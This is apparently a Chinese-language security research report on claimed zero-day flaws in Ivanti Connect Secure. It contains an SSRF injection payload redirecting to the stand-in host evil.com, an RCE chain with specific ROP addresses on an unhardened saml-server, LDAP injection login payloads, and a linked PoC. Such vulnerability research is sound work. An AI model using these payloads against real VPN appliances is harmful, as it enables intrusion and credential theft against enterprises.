# Ivanti Connect Secure 零日漏洞研究报告

## 已确认的零日候选漏洞

### ZD-1: oauth-consumer.cgi SSRF (预认证)
- **端点**: `/dana-na/auth/oauth-consumer.cgi` (200 OK, 无需认证)
- **根因**: `state` 参数直接拼接到内部 curl URL
- **代码**: `$url = 'http://localhost:7300/...?state=' . $state; curl->setopt(CURLOPT_URL, $url)`
- **利用**: 参数注入 `state=x%26targetURL=http://evil.com`
- **影响**: SSRF → 内部服务访问 → 潜在认证绕过/凭据窃取
- **条件**: OAuth/OIDC SSO 配置（企业部署常见）
- **状态**: 代码审计确认 + 动态验证内部请求发送

### ZD-2: ObjectTag::rewrite sprintf 栈溢出
- **位置**: `libdslibs.so` → `ObjectTag::rewrite()` (10938 bytes)
- **根因**: `sprintf(stack_buf, "<param name='neoteris-doc-base' value='%s' />", URL)`
- **目标**: saml-server (22.8R2.2) — **无 Canary, 无 PIE** (base 0x08048000)
- **利用**: 恶意网页 `<object>` 标签 → VPN Web代理重写 → sprintf 栈溢出 → ROP → RCE
- **ROP**: `execv@0x080b6700` + `"/bin/sh"@0x081c5701`
- **条件**: 认证用户通过 Web 代理访问恶意页面
- **PoC**: [poc_objecttag_overflow.py](poc_objecttag_overflow.py)

### ZD-3: saml-server 系统性安全缺失 (22.8R2.2)
- **二进制**: 2.1MB, **无 Stack Canary**, **无 PIE**, Partial RELRO
- **危险函数**: 4 strcpy + 6 sprintf + 218 memcpy + popen + execv
- **攻击面**: SAML assertion 处理（预认证，配置依赖）
- **条件**: SAML SSO + legacy policy（允许未签名 assertion）
- **发现**: `"Assertion need not be signed - legacy SAML SSO Policies"`

### ZD-4: LDAP 注入认证逻辑异常
- **端点**: `/dana-na/auth/url_default/login.cgi`
- **现象**: LDAP 注入使认证逻辑走不同路径
  - 正常失败: `302 → welcome.cgi?p=failed`
  - 注入后: `302 → welcome.cgi` (无 `p=failed`)
- **Payload**: `username=admin)(&)`, `username=admin)(|(password=*))`
- **影响**: 认证逻辑被干扰，在 LDAP 部署中可能更严重

## 动态测试覆盖

| 测试 | 结果 |
|------|------|
| 路径遍历 (CVE-2023-46805) | 已修复 |
| XFF 溢出 (CVE-2025-22457) | 已修复 |
| 命令注入 (CVE-2024-21887) | 已修复 |
| HTTP 请求走私 | 已防护 |
| Host Header 注入 | 已防护 |
| SAML XXE | 未发现 |
| JWT alg:none | 未生效 |
| Cookie 伪造 | 已防护 |
| SSTI | 误报 |
| Multipart 解析器 | 500但不崩溃 |
| LDAP 注入 | 异常行为已确认 |
| OAuth SSRF | 已确认 |

## 二进制安全评估

| 版本 | 二进制 | Canary | PIE | RELRO | 危险函数 |
|------|--------|--------|-----|-------|----------|
| 22.7R2.3 | web | **NO** | Yes | Partial | 5 sprintf |
| 22.7R2.8 | web | Yes | Yes | Full | 0 sprintf |
| 22.8R2.2 | nginx | Yes | Yes | Full | 安全 |
| 22.8R2.2 | **saml-server** | **NO** | **NO** | Partial | 4 strcpy + 6 sprintf |
| 22.8R2.2 | **browse-server** | **NO** | **NO** | Partial | 2 sprintf |

## 补丁 Diff 关键发现 (R2.3 → R2.8)
- `canonicalizeIP`: 3字节桩 → 448字节实函数
- `isValidIpFormat` / `isValidClientAttrVal`: 新增
- `DSCSProxyHandler::checkAccess`: +3778 字节
- URL重写: "Buffer end overrun risk" 检查新增
- 编译选项: 新增 Canary + FORTIFY + Full RELRO
